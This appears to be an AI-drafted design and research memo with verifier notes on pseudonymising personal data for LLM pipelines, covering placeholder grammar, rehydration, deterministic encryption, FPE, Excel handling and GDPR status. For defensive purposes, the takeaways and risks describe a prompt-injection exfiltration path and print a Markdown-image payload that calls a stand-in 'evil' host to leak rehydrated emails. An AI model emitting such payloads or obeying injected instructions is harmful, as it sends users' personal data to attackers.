# pseudo-ops

### Key takeaways
- Relayed user question is about Excel. Within this scope: spreadsheets need operators chosen per column, not per entity. Typed placeholders break numeric and date cells and formulas. Dates should be shifted or reduced to the year, IDs replaced by placeholders (or by FF1 later, opt-in only), and placeholder numbering must stay consistent across the whole workbook, all sheets included.
- Typed indexed placeholders gave the best LLM utility among the non-surrogate methods tested. On MUSR with GPT-4o mini: original 0.73, category+ID pseudonymisation 0.70, generalisation 0.58, generic [REDACTED] 0.52. RAG suffered most (0.80 to 0.32), because answers depended on the replaced entities (Deußer et al., arXiv 2609.11335, Sep 2026).
- Realistic surrogates keep more fluency than placeholders: one single-author preprint reports BERTScore 81.59% to 94.85% (SurrogateShield, arXiv 2606.29567). A PrivateNLP 2025 study found masking costs only about 1 point on a 10-point quality scale once entities are mapped back. The evidence is thin and mostly preprints, so surrogates are not clearly better for summarisation, QA or extraction.
- Surrogates hide missed PII 'in plain sight'. Typed tags make any unreplaced name stand out, while consistent surrogates still leak through single-occurrence outliers: at a 0.1% miss rate, document leakage was 27.1% with consistent surrogates vs 0.1% with a Markov strategy (Osborne et al. 2025). Surrogates also bring in real-world associations and make rehydration ambiguous.
- Format-preserving encryption: NIST SP 800-38G Rev.1 second public draft (3 Feb 2025) drops FF3 and keeps only FF1, and the ff3/FF3-1 Python libraries are now dead ends. The only maintained MIT FF1 package found, fpr-ff1 2.1.1 (Oct 2026), has a single maintainer and no audit. Google SDP itself discourages FFX unless the format must be kept.
- Deterministic encryption with AES-SIV (RFC 5297) is available in pyca/cryptography (AESSIV, since 37.0.0; Apache-2.0 OR BSD). It is reversible without a vault but reveals equal values, and its base64 output is long and costly in tokens. Use it only for an opt-in, tenant-persistent mode, never as the default for text sent to an LLM.
- HMAC-SHA256 with a random per-session key is the right internal primitive for consistency: it maps normalised values to indices without storing plaintext keys. Do not put HMAC hex in the text sent to the LLM; consistent random strings did no better than category+ID placeholders. Never use unkeyed or salted plain hashes: Presidio's 'hash' is SHA(text||salt), with a fresh random salt per call by default.
- Python cannot reliably erase secrets: cryptography states it 'does not clear memory by default' because immutable bytes and str cannot be wiped. The mapping, which holds plaintext PII strings, matters more than the key. 'Destroyed' should therefore mean dropped references, recycled workers, no swap, no core dumps and no logs, and should be described as best effort.
- Legal: pseudonymised data stay personal data for the controller and for us as processor (EDPB Guidelines 01/2025, which still look like the consultation version; CNIL). The CJEU's EDPS v SRB ruling (C-413/23 P, 4 Sep 2025) allows the text to be non-personal for a recipient without reasonable means to re-identify, but residual quasi-identifiers and LLM re-identification at scale (Lermen et al. 2026: 67% at 90% precision) argue against relying on that.
- Digital Omnibus: the Council's 2 Oct 2026 text reportedly drops the Art. 4(1) relative definition, adds an Art. 25a on pseudonymised data, and keeps processors under the GDPR. Parliament has no position yet and no trilogue has started, so there is no change to rely on in 2026.
- Existing designs worth copying are now unmaintained. LLM Guard (MIT) was archived on 9 Jul 2026. langchain-experimental, whose anonymizer had a reversible mode and fuzzy matching, was archived on 26 May 2026. Presidio is now community-run under data-privacy-stack (MIT, 2.2.364, Jul 2026). Its encrypt operator is unauthenticated AES-CBC with a random IV, so it is not deterministic: borrow the operator abstraction, not the crypto.
- Fuzzy rehydration as LLM Guard and LangChain implement it (Levenshtein distance up to 3) can misattribute entities: '[REDACTED_PERSON_1' matches within '[REDACTED_PERSON_12]' at distance 1 (my inference from their code). LangChain's case-insensitive mode also passes placeholders to re.sub unescaped. Be tolerant only of labels, case, brackets and Markdown escapes, never of the digits.
- Rehydration is an exfiltration path: an injected instruction such as '![](https://evil/?q=[EMAIL_1])', rehydrated before rendering or a tool call, sends PII out (Markdown-image exfiltration: EchoLeak CVE-2025-32711, Superhuman Jan 2026). Rehydrate only plain-text spans for display to the authorised user, never inside URLs, image sources or tool arguments.

### Recommendations
- Operator set for v1: keep, redact, replace (typed indexed placeholder, the DEFAULT), mask (partial, display only), generalize (date to year or month, age to 5- or 10-year band with 90+, postal code to département, amount to bucket), date_shift (consistent random offset per scope), hmac_token (keyed HMAC-SHA256, one-way, opt-in), surrogate (Faker, opt-in), encrypt_det (AES-SIV, tenant key, opt-in). FF1 FPE comes later and only for structured columns.
- Placeholder grammar for emission: '[' LABEL '_' INDEX ']', with LABEL = [A-Z][A-Z0-9]{1,23} (ASCII, no underscore, no accents) and INDEX = [1-9][0-9]{0,5}. Regex: \[(?P<label>[A-Z][A-Z0-9]{1,23})_(?P<idx>[1-9]\d{0,5})\]. Indices start at 1 per type and follow first appearance in the scope. Examples: [PERSONNE_1], [ORG_2], [LIEU_1], [ADRESSE_1], [EMAIL_1], [TEL_1], [IBAN_1], [NIR_1], [SIRET_1], [DATE_3].
- Use square brackets, never angle brackets. Under CommonMark, '<PERSON>' is a valid raw HTML tag that renderers and sanitizers swallow, as Presidio's default does. '<PERSON_0>' escapes this only because of the underscore. Square brackets become links only when a matching reference definition exists.
- Label language: keep canonical type IDs internally in English. Pick display labels from the country pack (French by default for FR documents). Rehydration accepts a closed table of aliases across all supported languages (for example PERSONNE, PERSON and PERSONA all map to PERSON), and the match key is (canonical_type, index).
- Rehydration parser: undo Markdown backslash escapes, match case-insensitively, accept _, - or a space as separator, and accept (), ⟦⟧ or «» as well as []. Accept a bare LABEL_N only if the label is a known alias and (type, index) exists in the mapping. Never fuzzy-match digits. Substitute in a single regex pass. Leave unknown or invented indices as they are and flag them.
- Before anonymising, detect placeholder-like strings already in the input and neutralise them (escape them, or map them to themselves) so forged '[PERSONNE_1]' tokens cannot pull real PII into the output. Escape original values for the output context (Markdown or HTML) when rehydrating.
- Do safe rehydration in the client or proxy only, and only for text displayed to the authorised user. Never rehydrate inside link or image URLs, code blocks bound for execution, or tool-call arguments. Optionally strip external Markdown images. Buffer streamed output until a ']' or a maximum token length so placeholders split across chunks are handled.
- MCP mode: one-way anonymisation by default. Never return a mapping or a 'rehydrate' result through an MCP tool, because tool output enters the third-party LLM context. Offer rehydration only through the REST API or proxy, to the authenticated caller.
- Consistency scopes and defaults: per request (default for /documents and MCP, mapping discarded with the response); per session (default for the chat proxy, idle TTL about 30 minutes and absolute TTL about 12 hours, configurable, memory only or stored encrypted under a session key the client holds); tenant-persistent (opt-in, BYOK through KMS, HKDF-separated keys for HMAC and SIV, access logging). The persistent mode creates cross-session linkability, so document it in the customer's DPIA.
- Key design: K_session = secrets.token_bytes(32) kept in a bytearray. Internal consistency index = HMAC-SHA256(K_session, canonical_type || 0x00 || normalize(value)), with NFKC, casefold, collapsed whitespace, and separators stripped for identifiers. When reversibility is off, store only HMAC to index (no plaintext). When on, add an index-to-original map. Destroy by zeroing the bytearray and dropping references, then recycle workers periodically. Disable core dumps and swap and never log values.
- Add a short preamble, as LLM Guard does, telling the LLM that bracketed tokens are pseudonyms to copy verbatim, in the conversation language. Also leave civility markers (M., Mme) outside the span so French gender agreement survives without adding gender hints to placeholders.
- Surrogate mode (opt-in, for writing tasks): keep a bijective mapping with collision checks against the input text and other surrogates. Use reserved or invalid ranges: example.com/.test emails (RFC 2606), non-assignable phone numbers, and placeholders rather than surrogates for national IDs, IBANs and cards. Block well-known real names. Rehydrate by exact match on the surrogate set only.
- Excel/CSV: choose the operator per column after type inference. Identifier columns get placeholders (or FF1 later if downstream validation needs the format). Date columns get date_shift or year generalisation. Amounts are kept or bucketed. One mapping scope per workbook so indices match across sheets. Evaluate or remove formulas before anonymising, because concatenation formulas can rebuild PII.
- Never call output 'anonymous' or 'anonymised' after the mapping is destroyed. Label it 'pseudonymised: residual quasi-identifiers possible', in line with the EDPB, the CNIL and the three CNIL criteria (singling out, linkability, inference).

### Risks
- Placeholder drift: the LLM may translate the label, change its case, drop or escape brackets, or merge or invent indices. Unknown tokens stay unrehydrated and over-tolerant matching misattributes entities. Keep a closed alias table, exact digits and a single-pass substitution.
- A missed detection is obvious next to typed tags (the real name sits beside [PERSONNE_1]). With consistent surrogates, single-occurrence outliers still leak (Osborne et al.: 27.1% document leakage at 0.1% FNER).
- Surrogates may collide with real people or companies (misattribution, defamation, LLM world-knowledge contamination), may collide with other words in the text, which corrupts rehydration, and Faker output is not reproducible across versions.
- Index and structure leakage: indices reveal per-type counts and order of first mention, and labels reveal categories (for example [NIR_1] signals a social or health context). Masking and FPE keep length and format, and deterministic tokens such as AES-SIV or tenant HMAC reveal equality across sessions, which enables provider-side profiling.
- Python memory: str and bytes holding PII or keys cannot be zeroed, and copies persist until the allocator reuses the memory. Swap, core dumps, crash reporters, APM traces or logs could persist the mapping. Erasure is best effort only.
- Rehydration as an exfiltration vector: prompt-injected URLs or image links carrying placeholders, rehydrated before rendering or a tool call, leak PII (OWASP LLM05; EchoLeak CVE-2025-32711).
- Placeholder forgery: input text that already contains '[PERSONNE_1]', for example a previously anonymised document or attacker content, can cause wrong rehydration unless it is neutralised first.
- FPE: FF3 and FF3-1 have been removed from the NIST draft, and FF1 Python implementations are young and unaudited. Small domains such as département codes are below the 1e6 minimum. FPE output can be a valid identifier belonging to someone else.
- Legal reliance on EDPS v SRB is fragile: LLM providers hold vast auxiliary knowledge, and LLM-based re-identification is cheap ($1-4 per profile in Lermen et al.). The Digital Omnibus changes are still in negotiation. Tenant-persistent vaults extend storage and linkability obligations.
- Dependence on archived projects (LLM Guard, langchain-experimental): bugs will not be fixed and supply-chain risk grows. Re-implement the small pieces instead of importing them.

### Open questions
- Token cost of the label choices ([PERSONNE_1] vs [PERSON_1] vs [PER_1], HMAC hex, AES-SIV base64) was NOT measured because shell commands were out of scope. Measure with tiktoken o200k_base and with the Llama-3, Mistral and Claude tokenizers before freezing labels.
- The shared web-search budget ran out during this run, so several points are unverified: whether the EDPB has finalised Guidelines 01/2025 (a secondary source says no final version as of Sept 2026), the outcome of the Council's 11 Oct 2026 Coreper meeting on the Digital Omnibus, the ARCEP ranges of phone numbers reserved for fiction (for surrogates), and the HHS Safe Harbor wording (the fetch returned 403).
- There is no 2023-2026 head-to-head benchmark of typed placeholders vs surrogates on summarisation, QA and extraction in French. Build an internal eval: French corpora, three operators, round-trip rehydration error rate, plus how often LLMs alter placeholders under translation.
- Is a gender or number hint worth it for French agreement ([PERSONNE_1] vs [PERSONNE_F_1])? It improves fluency but leaks a quasi-identifier.
- Should coreference such as 'M. Dupont', 'Jean Dupont' and 'J. Dupont' map to one index, given that wrong merges are worse than splits?
- Hosted multi-worker sessions: can a mapping encrypted with AES-GCM in Redis, under a key carried only in the client's session token, satisfy both statelessness and the claim that the server cannot read mappings at rest?
- Excel: should FF1 be offered for identifier columns where downstream checks (Luhn, mod-97) must pass, given that output may be another person's real identifier, or should placeholders be the only choice?

### Critical claims
- NIST SP 800-38G Rev. 1 second public draft (published 3 Feb 2025) no longer specifies FF3 (and does not carry FF3-1 forward), leaving FF1 as the only FPE method. It also forbids floating-point arithmetic and inverse-AES as CIPH. It remains a draft. [https://csrc.nist.gov/pubs/sp/800/38/g/r1/2pd]
- pyca/cryptography provides AESSIV (RFC 5297, added in 37.0.0). Without a nonce, the same (plaintext, key) pair always produces the same ciphertext. The library is dual-licensed under Apache or BSD. [https://cryptography.io/en/latest/hazmat/primitives/aead/]
- cryptography does not clear memory by default because there is no way to clear immutable structures such as bytes, so it is, like almost all Python software, potentially vulnerable to deallocated-memory attacks. [https://cryptography.io/en/stable/limitations/]
- Presidio's hash operator computes SHA-256/512 over text+salt (not HMAC), and since 2.2.361 it uses a random 32-byte salt per call by default, so equal values hash differently unless a salt is supplied. Its encrypt operator is AES-CBC with a random IV and no MAC. [https://github.com/data-privacy-stack/presidio/blob/main/presidio-anonymizer/presidio_anonymizer/operators/aes_cipher.py]
- presidio-anonymizer latest is 2.2.364 (2026-07-22), MIT, and the project has moved to the data-privacy-stack organisation. [https://pypi.org/pypi/presidio-anonymizer/json]
- LLM Guard (MIT) was archived on 9 Jul 2026. Its Anonymize scanner emits [REDACTED_<TYPE>_<index>]. Its Deanonymize scanner supports exact, case_insensitive, fuzzy (fuzzysearch, max_l_dist=3) and combined_exact_fuzzy matching. [https://github.com/protectai/llm-guard/blob/main/llm_guard/output_scanners/deanonymize.py]
- langchain-experimental (PresidioReversibleAnonymizer matching strategies) was archived on 26 May 2026. Its combined exact+fuzzy strategy is labelled RECOMMENDED, and the case-insensitive strategy passes keys unescaped to re.sub. [https://github.com/langchain-ai/langchain-experimental/blob/main/libs/experimental/langchain_experimental/data_anonymizer/deanonymizer_matching_strategies.py]
- In Deußer et al. (arXiv 2609.11335, Sep 2026), with GPT-4o mini on MUSR: original 0.73, category+ID pseudonymisation 0.70, generalisation 0.58, redaction 0.52. Pseudonymisation on the RGB RAG benchmark dropped from 0.80 to 0.32. [https://arxiv.org/html/2609.11335]
- Consistent surrogate substitution leaks missed PHI through single-occurrence outliers: document-level leakage was 27.1% (consistent) vs 0.1% (Markov strategy) at a 0.1% false-negative rate, and 94.2% vs 57.7% at 0.5%. [https://pmc.ncbi.nlm.nih.gov/articles/PMC12536513/]
- An LLM agent re-identified 226 of 338 Hacker News users (67%) at 90% precision from their text, at $1-4 per profile (Lermen et al., arXiv 2602.16800, Feb 2026). [https://arxiv.org/html/2602.16800v1]
- In EDPS v SRB (C-413/23 P, 4 Sep 2025) the CJEU held that pseudonymised data are not necessarily personal data for a recipient who cannot re-identify by means reasonably likely to be used, while transparency is assessed from the controller's viewpoint at collection. [https://www.cliffordchance.com/insights/resources/blogs/talking-tech/en/articles/2025/09/pseudonymized-data-after-edps-v-srb.html]
- EDPB Guidelines 01/2025 on Pseudonymisation were adopted on 16 Jan 2025 for public consultation (open until 14 Mar 2025). They state that pseudonymised data remain personal data even when another party holds the additional information. [https://www.edpb.europa.eu/public-consultations/guidelines-012025-on-pseudonymisation_en]
- Google Sensitive Data Protection's CryptoDeterministicConfig uses AES-SIV, and Google advises against CryptoReplaceFfxFpeConfig except when preserving the input alphabet and size is a requirement. [https://docs.cloud.google.com/sensitive-data-protection/docs/transformations-reference]
- CommonMark 0.31.2: a raw-HTML tag name is an ASCII letter followed by letters, digits or hyphens, so '<PERSON>' parses as HTML and '<PERSON_1>' does not. A shortcut reference link '[foo]' becomes a link only if a matching link reference definition exists. [https://spec.commonmark.org/0.31.2/]
- fpr-ff1 2.1.1 (2026-10-11) is MIT-licensed, implements only FF1 with radix^minlen >= 1,000,000, and states that it is not audited, not constant-time and does not zeroise keys. mysto 'ff3' (Apache-2.0) implements only FF3/FF3-1. [https://pypi.org/project/fpr-ff1/]

### Verifier notes
- My web-search budget was used up at the start (shared turn limit), so all checks used direct WebFetch of primary pages. curia.europa.eu and EUR-Lex returned empty or redirected pages, so claim 11 rests on the Clifford Chance analysis. I could not read the EDPB PDF text because no PDF renderer was available.
- MAJOR OMISSION (legal): EDPB Guidelines 02/2026 on Anonymisation (v1, plus a 'Guidelines at a Glance: how to assess the anonymity of data' summary) are in public consultation from 08 Jul to 30 Oct 2026 (https://www.edpb.europa.eu/public-consultations/guidelines-022026-on-anonymisation_en). The takeaways and the final recommendation still lean on the 'three CNIL criteria (singling out, linkability, inference)', which come from WP29 Opinion 05/2014. They should cite and track 02/2026, which very likely addresses the post-SRB relative approach. The same EDPB list also shows Guidelines 03/2026 on web scraping for generative AI (consultation until 30 Oct 2026).
- Claim 8 / takeaway 2: the Deußer paper contradicts itself on the original score (0.73 in Sec. 4.2, 0.70 in Table 5). It tested '<LOC>-1' placeholders with angle brackets, not [LABEL_N], so it does not directly validate the proposed grammar. Its 'Generalization' (0.58) means a non-indexed category label such as [CITY], not GDPR Guardian's generalize operator (date to year, etc.); the takeaway should say so to avoid confusion.
- The recommendation to 'add a short preamble, as LLM Guard does' is weakly supported. LLM Guard's preamble parameter defaults to an empty string. Deußer et al. tested short and long 'the input is anonymized' prefixes on GPT-4o mini and found they 'did not yield any significant or consistent improvement'. The preamble is harmless, but present it as optional and unproven.
- FF1 under the 2PD requires radix^minlen >= 1,000,000. For Excel this means FF1 cannot encrypt 5-digit French postal codes, short numeric IDs, or any column of fewer than 6 decimal digits. Identifiers with check digits must have the check part excluded from FF1 and recomputed afterwards, or downstream validation (the stated reason for FF1) fails. Verified in python-stdnum: NIR key = 97 - (first 13 digits mod 97), with 2A->19 and 2B->18 before the computation. SIRET uses Luhn on 14 digits, except La Poste establishments (prefix 356000000 other than the head office 35600000000048), which require a digit sum divisible by 5. IBAN uses ISO 7064 mod 97-10.
- python-stdnum, the reference used for those checksums, is LGPL-2.1-or-later, not MIT. GDPR Guardian should re-implement these short algorithms rather than depend on stdnum if it wants to stay MIT-only.
- 'Postal code to département' generalisation must not just take the first 2 digits. Corsica uses 20xxx for both 2A and 2B, overseas départements use 97x/98x (3-digit codes), some postal codes serve communes in a neighbouring département, and CEDEX codes exist. Map through code_commune_insee from the La Poste base (Licence Ouverte 2.0, confirmed) or through the INSEE COG.
- Excel-specific omissions in the key takeaways and recommendations. Besides formulas, PII persists in: pivot caches (pivotCacheRecords keep a copy of the source rows), comments/notes and threaded comments, hidden or very hidden sheets, defined names, data-validation lists, headers/footers, chart caches, external links, and document properties (creator, lastModifiedBy). The shared-strings table is fine to rewrite, but these other parts are not covered by cell rewriting. Also, date cells are serial numbers with a number format, so date_shift must keep them numeric. CSV output also needs formula-injection guarding (values starting with =, +, -, @), which matters for surrogate, hmac_token or encrypt_det outputs.
- The LangChain case-insensitive issue is wider than stated. Besides the unescaped pattern, the replacement string (the real value) is passed unescaped to re.sub, so backslashes in originals are read as group references and can raise errors or corrupt output.
- The fuzzy-rehydration risk is stronger than the '[..._1' inside '[..._12]' example suggests. '[REDACTED_PERSON_1]' and '[REDACTED_PERSON_2]' are at Levenshtein distance 1, well within max_l_dist=3, so the fuzzy pass can swap sibling entities whenever the LLM slightly mangles a placeholder. This supports the advice to never fuzzy-match digits.
- Key-zeroisation advice: zeroing a bytearray K_session is best effort only. hmac.new and OpenSSL HMAC contexts, and cryptography's AESSIV, copy the key internally (the cryptography limitations page and fpr-ff1 both say this kind of wiping is unreliable). The docs should state that only the caller's buffer is wiped.
- Unverified (could not fetch): the Digital Omnibus statement (Council text of 2 Oct 2026 dropping the relative Art. 4(1) definition and adding Art. 25a, with no Parliament position). consilium.europa.eu returned 403. Treat it as unconfirmed until it is checked against the Council press release or the OEIL procedure file. Also unverified: SurrogateShield (arXiv 2606.29567), the PrivateNLP 2025 study, the Superhuman Jan 2026 exfiltration, and Presidio being 'community-run' (the README only says it 'has moved to a new home').
- Minor: EchoLeak is correctly CVE-2025-32711. The EDPB 01/2025 consultation deadline was originally 28 Feb 2025 (news of 17 Jan 2025) and was extended to 14 Mar 2025. 'Still looks like the consultation version' is accurate: only v1 is listed as of today.
- Possible missed FF1 option, not checked: the Rust 'fpe' crate (MIT OR Apache-2.0) implements FF1, but it would need Python bindings, and I did not confirm it enforces the 2PD 1,000,000 minimum domain. The claim that fpr-ff1 is the only maintained MIT FF1 package found holds only for PyPI.
